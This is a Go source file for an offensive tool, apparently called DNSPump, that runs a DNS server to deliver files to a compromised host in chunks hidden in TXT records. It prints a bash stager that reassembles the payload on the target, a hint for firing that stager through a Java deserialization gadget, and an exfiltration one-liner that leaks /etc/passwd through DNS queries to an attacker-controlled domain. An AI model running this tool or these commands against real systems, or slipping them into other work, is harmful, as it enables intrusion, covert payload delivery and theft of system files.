/*
* Copyright 2019, Travis Biehn
* All rights reserved.
*
* This source code is licensed under the MIT license found in the
* LICENSE file in the root directory of this source tree.
*
 */

package main

import (
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

var banner = `
 mmmm   mm   m  mmmm  mmmmm  m    m m    m mmmmm
 #   "m #"m  # #"   " #   "# #    # ##  ## #   "#
 #    # # #m # "#mmm  #mmm#" #    # # ## # #mmm#"
 #    # #  # #     "# #      #    # # "" # #
 #mmm"  #   ## "mmm#" #      "mmmm" #    # #

dualuse.io - FINE DUAL USE TECHNOLOGIES
`

var bashTempl = `#!/bin/bash
rm -rf %s
for (( i=0; i<%d; i++ ))
do
f=0
while [ "$f" -le "4" ]; do
l=` + "`%s`" + `
if [ "` + "`expr length \\\"$l\\\"`" + `" -ne "0" ];
then 
f=5
echo -n $l|base64 -d>>%s
fi
((f++))
if [ "$f" -le "4" ]
then
sleep 1
fi
done
done
`

var port = flag.Int("port", 53, "DNS Port")
var name = flag.String("name", "", "Domain Name (contoso.com)")
var writeTo = flag.String("dst", "/tmp/pump", "Destination Directory")
var servedFile = flag.String("file", "", "File to serve.")
var useDig = flag.Bool("dig", true, "Use dig instead of nslookup?")
var maxSize = flag.Int("max", 1000, "Maximum size of DNS reply - 500 may work better.")

var digCmd = `dig +short  $i.%s TXT | tr -d "\n\" "`
var nslookupCmd = `nslookup -q=TXT $i.%s | grep -v "^A" | tr -d "\n\" " | cut -d "=" -f 2-|tr -d "\n"`

var records = map[string]string{}

func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeTXT:
			//log.Printf("Query for %s\n", q.Name)
			if strings.HasPrefix(q.Name, "d.") {
				//decode from HEX.
				h, e := hex.DecodeString(strings.Split(q.Name, ".")[1])
				if e == nil {
					fmt.Printf("%s", h)
				}
				rr, err := dns.NewRR(fmt.Sprintf("%s 3600 IN TXT %s", q.Name, "aehuaiheeaiuhea"))
				if err == nil {
					m.Answer = append(m.Answer, rr)
				}
			} else {
				ip := records[q.Name]
				if ip != "" {
					rr, err := dns.NewRR(fmt.Sprintf("%s 3600 IN TXT %s", q.Name, ip))
					fmt.Printf(".")

					if err == nil {
						m.Answer = append(m.Answer, rr)
					}
				}
			}
		}
	}
}

func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func main() {

	fmt.Print(banner)
	flag.Parse()
	if strings.Compare(*name, "") == 0 {
		fmt.Println("Specify a valid domain; e.g. -name contoso.com")
		return
	}
	if strings.Compare(*servedFile, "") == 0 {
		fmt.Println("Specify a valid file to serve.")
		return
	}

	payloadMax := (3 * *maxSize) / 4
	fmt.Printf("DNS payload size of %d bytes ~ configured for %d base64 encoded bytes per request.\n", *maxSize, payloadMax)

	prefix := RandStringRunes(5)

	file, err := ioutil.ReadFile(*servedFile)
	if err != nil {
		fmt.Printf("Failed to read file %s\n", *servedFile)
		return
	}

	chunks := len(file) / payloadMax
	if len(file)%payloadMax != 0 {
		chunks++
	}

	fmt.Printf("Loaded File: %s. Serving %d bytes in %d chunks.\n", *servedFile, len(file), chunks)
	prefixedName := prefix + "." + *name

	cPtr := 0
	cIdx := 0
	for cPtr < len(file) {
		cEnd := cPtr + payloadMax
		if cEnd > len(file) {
			cEnd = len(file)
		}
		records[fmt.Sprintf("%d.%s.", cIdx, prefixedName)] = base64.StdEncoding.EncodeToString(file[cPtr:cEnd])
		cPtr += payloadMax
		cIdx++
	}
	fmt.Printf("Chunks loaded\n")

	command := fmt.Sprintf(nslookupCmd, prefixedName)

	if *useDig {
		command = fmt.Sprintf(digCmd, prefixedName)
	}

	fmt.Printf(`
Stager script (Copy to target and run it);
###
`)

	command = fmt.Sprintf(bashTempl, *writeTo, chunks, command, *writeTo)
	fmt.Print(command)
	fmt.Printf(`
/###
Hint; CommonsCollections1 "bash -c echo$IFS'%s'|base64$IFS-d$IFS>/tmp/dank.sh"
`, base64.StdEncoding.EncodeToString([]byte(command)))

	fmt.Printf("Exfil; for line in `cat /etc/passwd|xxd -p`; do dig d.$line.%s TXT; sleep 1; done\n", prefixedName)
	// attach request handler func
	dns.HandleFunc(fmt.Sprintf("%s.", *name), handleDnsRequest)

	// start server
	server := &dns.Server{Addr: ":" + strconv.Itoa(*port), Net: "udp"}
	serverTCP := &dns.Server{Addr: ":" + strconv.Itoa(*port), Net: "tcp"}

	log.Printf("Starting at %d\n", *port)

	go server.ListenAndServe()
	defer server.Shutdown()
	serverTCP.ListenAndServe()
	defer serverTCP.Shutdown()

}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz0123456789")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
